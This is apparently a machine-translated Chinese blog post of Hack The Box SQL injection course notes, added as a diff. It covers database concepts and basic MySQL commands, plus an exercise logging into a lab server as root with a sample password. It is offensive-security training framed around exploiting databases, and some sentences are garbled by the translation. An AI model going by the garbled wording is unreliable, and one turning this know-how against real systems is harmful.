+<p>SQL 注入的另一个用例是破坏预期的 Web 应用程序逻辑。最常见的示例是在不传递有效的用户名和密码凭据对的情况下绕过登录。另一个例子是访问锁定给特定用户的功能，比如管理面板。攻击者还可以直接在后台服务器上读写文件，进而在后台服务器上设置后门，直接控制后台服务器，最终控制整个后台服务器。网站。</p>
+<h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><p>SQL 注入通常是由编码不当的 Web 应用程序或不安全的后端服务器和数据库权限引起的。稍后，我们将讨论通过安全编码方法（例如用户输入清理和验证以及适当的后端用户权限和控制）来减少易受 SQL 注入攻击的机会的方法。</p>
+<h1 id="数据库简介"><a href="#数据库简介" class="headerlink" title="数据库简介"></a>数据库简介</h1><p>在我们了解 SQL 注入之前，我们需要更多地了解数据库和结构化查询语言 (SQL)，哪些数据库将执行必要的查询。网络应用程序利用后端数据库来存储与网络应用程序相关的各种内容和信息。这可以是核心 Web 应用程序资产，如图像和文件、内容（如帖子和更新）或用户数据（如用户名和密码）。</p>
+<p>有许多不同类型的数据库，每一种都适合特定的用途。传统上，应用程序使用基于文件的数据库，随着大小的增加，速度非常慢。<code>Database Management Systems</code>这导致了( )的采用<code>DBMS</code>。</p>
+<h2 id="数据库管理系统"><a href="#数据库管理系统" class="headerlink" title="数据库管理系统"></a>数据库管理系统</h2><p>数据库管理系统 (DBMS) 有助于创建、定义、托管和管理数据库。随着时间的推移，设计了各种 DBMS，例如基于文件、关系 DBMS (RDBMS)、NoSQL、基于图形和键&#x2F;值存储。</p>
+<p>有多种方式可以与 DBMS 交互，例如命令行工具、图形界面，甚至 API（应用程序编程接口）。DBMS 用于各种银行、金融和教育部门以记录大量数据。DBMS 的一些基本特征包括：</p>
+<table>
+<thead>
+<tr>
+<th><strong>特征</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Concurrency</code></td>
+<td>一个真实世界的应用程序可能有多个用户同时与之交互。DBMS 确保这些并发交互成功而不会损坏或丢失任何数据。</td>
+</tr>
+<tr>
+<td><code>Consistency</code></td>
+<td>对于如此多的并发交互，DBMS 需要确保数据在整个数据库中保持一致和有效。</td>
+</tr>
+<tr>
+<td><code>Security</code></td>
+<td>DBMS 通过用户身份验证和权限提供细粒度的安全控制。这将防止未经授权查看或编辑敏感数据。</td>
+</tr>
+<tr>
+<td><code>Reliability</code></td>
+<td>备份数据库并在数据丢失或破坏的情况下将它们回滚到以前的状态很容易。</td>
+</tr>
+<tr>
+<td><code>Structured Query Language</code></td>
+<td>SQL 通过支持各种操作的直观语法简化了用户与数据库的交互。</td>
+</tr>
+</tbody></table>
+<h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C2.png"></p>
+<p><code>Tier I</code>通常由客户端应用程序组成，例如网站或 GUI 程序。这些应用程序由高级交互组成，例如用户登录或评论。<code>Tier II</code>来自这些交互的数据通过 API 调用或其他请求传递。</p>
+<p>第二层是中间件，它解释这些事件并将它们放入 DBMS 所需的格式中。最后，应用层根据 DBMS 的类型使用特定的库和驱动程序与它们进行交互。DBMS 从第二层接收查询并执行请求的操作。这些操作可能包括数据的插入、检索、删除或更新。处理后，DBMS 返回任何请求的数据或错误代码以应对无效查询。</p>
+<p>可以在同一台主机上托管应用程序服务器和 DBMS。但是，具有支持许多用户的大量数据的数据库通常单独托管以提高性能和可伸缩性。</p>
+<h1 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h1><p>一般来说，数据库分为<code>Relational Databases</code>和<code>Non-Relational Databases</code>。只有关系数据库使用 SQL，而非关系数据库使用多种通信方法。</p>
+<h2 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h2><p>​	关系数据库是最常见的数据库类型。它使用模式、模板来指示存储在数据库中的数据结构。例如，我们可以想象一家向其客户销售产品的公司拥有关于这些产品的去向、销售对象和数量的某种形式的存储知识。然而，这通常是在后端完成的，而在前端没有明显的通知。每种方法都可以使用不同类型的关系数据库。例如，第一个表可以存储和显示基本的客户信息，第二个表可以存储销售的产品数量及其成本，第三个表可以列举谁购买了这些产品以及支付数据。</p>
+<p>​	关系数据库中的表与提供快速数据库摘要或在需要查看特定数据时访问特定行或列的键相关联。这些表，也称为实体，都相互关联。例如，客户信息表可以为每个客户提供一个特定的 ID，该 ID 可以指示我们需要了解的有关该客户的所有信息，例如地址、姓名和联系信息。此外，产品描述表可以为每个产品分配一个特定的 ID。存储所有订单的表只需要记录这些 ID 及其数量。这些表格中的任何更改都会影响所有这些表格，但可以预见和系统地影响。</p>
+<p><code>relational database management system</code>但是，在处理集成数据库时，需要一个概念，即使用称为( )的键将一个表链接到另一个表<code>RDBMS</code>。许多最初使用不同概念的公司正在转向 RDBMS 概念，因为这个概念易于学习、使用和理解。最初，这个概念只被大公司使用。然而，许多类型的数据库现在都实现了 RDBMS 概念，例如 Microsoft Access、MySQL、SQL Server、Oracle、PostgreSQL 等等。</p>
+<p>例如，我们可以<code>users</code>在关系数据库中有一个表，其中包含<code>id</code>、<code>username</code>、<code>first_name</code>、<code>last_name</code>和其他列。可以<code>id</code>用作表键。另一个表<code>posts</code>可能包含所有用户发布的帖子，列有<code>id</code>、<code>user_id</code>、<code>date</code>、<code>content</code>等。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C3.png"></p>
+<p>​	我们可以将表中的<code>id</code>from链接<code>users</code>到<code>user_id</code>表中<code>posts</code>以检索每个帖子的用户详细信息，而无需存储每个帖子的所有用户详细信息。一个表可以有多个键，因为另一列可以用作键来链接另一个表。因此，例如，该<code>id</code>列可以用作将<code>posts</code>表链接到另一个包含评论的表的键，每个评论都属于一个特定的帖子，等等。</p>
+<p>数据库中表之间的关系称为模式。</p>
+<p>​	这样，通过使用关系数据库，可以快速轻松地从所有数据库中检索有关特定元素的所有数据。因此，例如，我们可以使用单个查询从所有表中检索链接到特定用户的所有详细信息。这使得关系数据库对于具有清晰结构和设计以及高效数据管理的大数据集非常快速和可靠。关系数据库最常见的示例是<code>MySQL</code>，我们将在本模块中介绍。</p>
+<h2 id="非关系数据库"><a href="#非关系数据库" class="headerlink" title="非关系数据库"></a>非关系数据库</h2><p>非关系数据库（也称为<code>NoSQL</code>数据库）不使用表、行和列或主键、关系或模式。相反，NoSQL 数据库根据存储的数据类型使用各种存储模型来存储数据。由于没有为数据库定义的结构，NoSQL 数据库具有很强的可扩展性和灵活性。因此，在处理定义和结构不是很好的数据集时，NoSQL 数据库将是存储此类数据的最佳选择。NoSQL 数据库有四种常见的存储模型：</p>
+<ul>
+<li>核心价值</li>
+<li>基于文档</li>
+<li>宽栏</li>
+<li>图形</li>
+</ul>
+<p>上述每个模型都有不同的数据存储方式。例如，该<code>Key-Value</code>模型通常以 JSON 或 XML 格式存储数据，每一对都有一个键，并将其所有数据存储为它的值：</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C4.png"></p>
+<p>上面的示例可以使用 JSON 表示为：</p>
+<p>代码：json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;100001&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;01-01-2021&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Welcome to this web application.&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;100002&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;02-01-2021&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;This is the first post on this web app.&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;100003&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;02-01-2021&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Reminder: Tomorrow is the ...&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	它看起来类似于<code>Python</code>or <code>PHP</code>（即<code>&#123;&#39;key&#39;:&#39;value&#39;&#125;</code>）等语言中的字典项，其中 the<code>key</code>通常是字符串，而 the<code>value</code>可以是字符串、字典或任何类对象。</p>
+<p>NoSQL 数据库最常见的示例是<code>MongoDB</code>.</p>
+<p>非关系数据库有一种不同的注入方法，称为 NoSQL 注入。SQL 注入与 NoSQL 注入完全不同。NoSQL 注入将在后面的模块中介绍。</p>
+<h1 id="MySQL-简介"><a href="#MySQL-简介" class="headerlink" title="MySQL 简介"></a>MySQL 简介</h1><p>本模块通过 介绍 SQL 注入<code>MySQL</code>，了解更多有关<code>MySQL</code>SQL 的信息以了解 SQL 注入的工作原理并正确利用它们至关重要。因此，本节将介绍一些 MySQL&#x2F;SQL 的基础知识和语法以及在 MySQL&#x2F;MariaDB 数据库中使用的示例。</p>
+<h2 id="结构化查询语言-SQL"><a href="#结构化查询语言-SQL" class="headerlink" title="结构化查询语言 (SQL)"></a>结构化查询语言 (SQL)</h2><p>SQL 语法可能因一个 RDBMS 而异。但是，它们都必须遵循结构化查询语言的<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ISO/IEC_9075">ISO 标准</a>。对于所示示例，我们将遵循 MySQL&#x2F;MariaDB 语法。SQL 可用于执行以下操作：</p>
+<ul>
+<li>检索数据</li>
+<li>更新数据</li>
+<li>删除数据</li>
+<li>创建新表和数据库</li>
+<li>添加&#x2F;删除用户</li>
+<li>为这些用户分配权限</li>
+</ul>
+<h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p>该<code>mysql</code>实用程序用于对 MySQL&#x2F;MariaDB 数据库进行身份验证并与之交互。该<code>-u</code>标志用于提供用户名和<code>-p</code>密码标志。该<code>-p</code>标志应为空，因此系统会提示我们输入密码并且不要直接在命令行上传递它，因为它可能以明文形式存储在 bash_history 文件中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mysql -u root -p</span><br><span class="line"></span><br><span class="line">Enter password: &lt;password&gt;</span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
+
+<p>同样，也可以直接在命令中使用密码，但应避免这种情况，因为这可能导致密码保存在日志和终端历史记录中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mysql -u root -p&lt;password&gt;</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
+
+<p>上面的例子让我们以超级用户的身份登录，即，“ <code>root</code>”和密码“ <code>password</code>，”拥有执行所有命令的权限。其他 DBMS 用户对他们可以执行的语句有一定的特权。我们可以使用稍后讨论的<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/show-grants.html">SHOW GRANTS命令查看我们拥有哪些权限。</a></p>
+<p>当我们不指定主机时，它将默认为<code>localhost</code>服务器。<code>-h</code>我们可以使用和标志指定远程主机和端口<code>-P</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p </span><br><span class="line"></span><br><span class="line">Enter password: </span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
+
+<p>注意：默认的 MySQL&#x2F;MariaDB 端口为（3306），但可以配置为其他端口。它是使用大写的“P”指定的，这与用于密码的小写“p”不同。</p>
+<p>注意：为了跟随示例，尝试使用 PwnBox 上的“mysql”工具登录到本节末尾问题中找到的 DBMS，使用其 IP 和端口。使用“root”作为用户名，使用“password”作为密码。</p>
+<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>一旦我们使用该实用程序登录到数据库<code>mysql</code>，我们就可以开始使用 SQL 查询与 DBMS 进行交互。例如，可以使用<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/create-database.html">CREATE DATABASE</a>语句在 MySQL DBMS 中创建一个新数据库。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE DATABASE users;</span><br><span class="line"></span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br></pre></td></tr></table></figure>
+
+<p>MySQL 期望命令行查询以分号结束。上面的示例创建了一个名为<code>users</code>. <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/show-databases.html">我们可以使用SHOW DATABASES</a>查看数据库列表，我们可以<code>users</code>使用以下<code>USE</code>语句切换到数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; USE users;</span><br><span class="line"></span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure>
+
+<p>SQL 语句不区分大小写，这意味着“使用用户；” 和“使用用户”；参考相同的命令。但是，数据库名称区分大小写，因此我们不能执行“USE USERS;” 而不是“使用用户；”。因此，最好用大写字母指定语句以避免混淆。</p>
+<h2 id="表"><a href="#表" class="headerlink" title="表"></a>表</h2><p>​	DBMS 以表的形式存储数据。表格由水平行和垂直列组成。行和列的交集称为单元格。每个表都是用一组固定的列创建的，其中每一列都是一种特定的数据类型。</p>
+<p>​	数据类型定义列要保存什么样的值。常见示例有<code>numbers</code>、<code>strings</code>、<code>date</code>、<code>time</code>和<code>binary data</code>。也可能有特定于 DBMS 的数据类型。<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/data-types.html">可以在此处</a>找到 MySQL 中数据类型的完整列表。例如，让我们使用<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/creating-tables.html">CREATE TABLE</a><code>logins</code> SQL 查询创建一个名为存储用户数据的表：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> logins (</span><br><span class="line">    id <span class="type">INT</span>,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    date_of_joining DATETIME</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<p>​	如我们所见，<code>CREATE TABLE</code>查询首先指定表名，然后（在括号内）我们通过名称和数据类型指定每一列，所有列均以逗号分隔。在名称和类型之后，我们可以指定具体的属性，这将在后面讨论。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE logins (</span><br><span class="line">    -&gt;     id INT,</span><br><span class="line">    -&gt;     username VARCHAR(100),</span><br><span class="line">    -&gt;     password VARCHAR(100),</span><br><span class="line">    -&gt;     date_of_joining DATETIME</span><br><span class="line">    -&gt;     );</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br></pre></td></tr></table></figure>
+
+<p>上面的 SQL 查询创建了一个<code>logins</code>以四列命名的表。第一列，<code>id</code>是一个整数。以下两列，每列<code>username</code>设置<code>password</code>为 100 个字符的字符串。任何超过此长度的输入都会导致错误。<code>date_of_joining</code>类型列存储<code>DATETIME</code>添加条目的日期。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line"></span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_users |</span><br><span class="line">+-----------------+</span><br><span class="line">| logins          |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>可以使用该语句获取当前数据库中的表列表<code>SHOW TABLES</code>。此外，<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/describe.html">DESCRIBE</a>关键字用于列出表结构及其字段和数据类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; DESCRIBE logins;</span><br><span class="line"></span><br><span class="line">+-----------------+--------------+</span><br><span class="line">| Field           | Type         |</span><br><span class="line">+-----------------+--------------+</span><br><span class="line">| id              | int          |</span><br><span class="line">| username        | varchar(100) |</span><br><span class="line">| password        | varchar(100) |</span><br><span class="line">| date_of_joining | date         |</span><br><span class="line">+-----------------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h4 id="表格属性"><a href="#表格属性" class="headerlink" title="表格属性"></a>表格属性</h4><p>在查询中，可以为表和每一列设置<code>CREATE TABLE</code>许多<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/create-table.html">属性。</a>例如，我们可以<code>id</code>使用关键字将列设置为自动递增<code>AUTO_INCREMENT</code>，每次向表中添加新项目时，id 自动递增 1：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br></pre></td></tr></table></figure>
+
+<p>该<code>NOT NULL</code>约束确保特定列永远不会留空“即必填字段”。我们还可以使用<code>UNIQUE</code>约束来确保插入的项目始终是唯一的。例如，如果我们将它与<code>username</code>列一起使用，我们可以确保没有两个用户具有相同的用户名：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br></pre></td></tr></table></figure>
+
+<p>另一个重要的关键字是<code>DEFAULT</code>关键字，用于指定默认值。例如，在<code>date_of_joining</code>列中，我们可以将默认值设置为<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now">Now()</a>，这在 MySQL 中返回当前日期和时间：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date_of_joining DATETIME <span class="keyword">DEFAULT</span> NOW(),</span><br></pre></td></tr></table></figure>
+
+<p>最后，最重要的属性之一是<code>PRIMARY KEY</code>，我们可以使用它来唯一标识表中的每条记录，引用关系数据库表中记录的所有数据，如前一节所述。我们可以为该表创建<code>id</code>列：<code>PRIMARY KEY</code></p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PRIMARY</span> KEY (id)</span><br></pre></td></tr></table></figure>
+
+<p>最终<code>CREATE TABLE</code>查询将如下所示：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> logins (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    date_of_joining DATETIME <span class="keyword">DEFAULT</span> NOW(),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>mysql -h 46.101.81.60 -P 30450 -u root -ppassword; 登录远程</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C5.png"></p>
+<h1 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h1><p>现在我们了解了如何使用该<code>mysql</code>实用程序以及如何创建数据库和表，让我们看看一些基本的 SQL 语句及其用途。</p>
+<h2 id="插入语句"><a href="#插入语句" class="headerlink" title="插入语句"></a>插入语句</h2><p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/insert.html">INSERT</a>语句用于向给定表添加新记录。遵循以下语法的语句：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name <span class="keyword">VALUES</span> (column1_value, column2_value, column3_value, ...);</span><br></pre></td></tr></table></figure>
+
+<p>上面的语法要求用户为表中存在的所有列填写值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO logins VALUES(1, &#x27;admin&#x27;, &#x27;p@ssw0rd&#x27;, &#x27;2020-07-02&#x27;);</span><br><span class="line"></span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>上面的示例显示了如何向登录表添加新登录，并为每一列添加适当的值。但是，我们可以跳过使用默认值填充列，例如<code>id</code>和<code>date_of_joining</code>。这可以通过指定列名以选择性地将值插入表中来完成：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name(column2, column3, ...) <span class="keyword">VALUES</span> (column2_value, column3_value, ...);</span><br></pre></td></tr></table></figure>
+
+<p>注意：跳过带有“NOT NULL”约束的列将导致错误，因为它是必需的值。</p>
+<p>我们可以做同样的事情来将值插入表中<code>logins</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO logins(username, password) VALUES(&#x27;administrator&#x27;, &#x27;adm1n_p@ss&#x27;);</span><br><span class="line"></span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>我们在上面的示例中插入了一个用户名-密码对，同时跳过了<code>id</code>和<code>date_of_joining</code>列。</p>
+<p>注意：示例将明文密码插入表中，仅用于演示。这是一个不好的做法，因为密码在存储之前应该总是被散列&#x2F;加密。</p>
+<p>我们还可以一次插入多条记录，方法是用逗号分隔它们：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO logins(username, password) VALUES (&#x27;john&#x27;, &#x27;john123!&#x27;), (&#x27;tom&#x27;, &#x27;tom123!&#x27;);</span><br><span class="line"></span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>
+
+<p>上面的查询一次插入了两条新记录。</p>
+<h2 id="选择语句"><a href="#选择语句" class="headerlink" title="选择语句"></a>选择语句</h2><p>现在我们已经将数据插入到表中，让我们看看如何使用<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/select.html">SELECT</a>语句检索数据。这个语句也可以用于许多其他目的，我们稍后会遇到。查看整个表的一般语法如下：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
+
+<p>星号 (*) 用作通配符并选择所有列。关键字<code>FROM</code>用于表示要从中选择的表。也可以查看特定列中的数据：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
+
+<p>上面的查询将仅选择 column1 和 column2 中存在的数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-02 11:47:16 |</span><br><span class="line">|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT username,password FROM logins;</span><br><span class="line"></span><br><span class="line">+---------------+------------+</span><br><span class="line">| username      | password   |</span><br><span class="line">+---------------+------------+</span><br><span class="line">| admin         | p@ssw0rd   |</span><br><span class="line">| administrator | adm1n_p@ss |</span><br><span class="line">| john          | john123!   |</span><br><span class="line">| tom           | tom123!    |</span><br><span class="line">+---------------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>上面示例中的第一个查询查看登录表中存在的所有记录。我们可以看到之前输入的四条记录。第二个查询只选择用户名和密码列，而跳过其他两个</p>
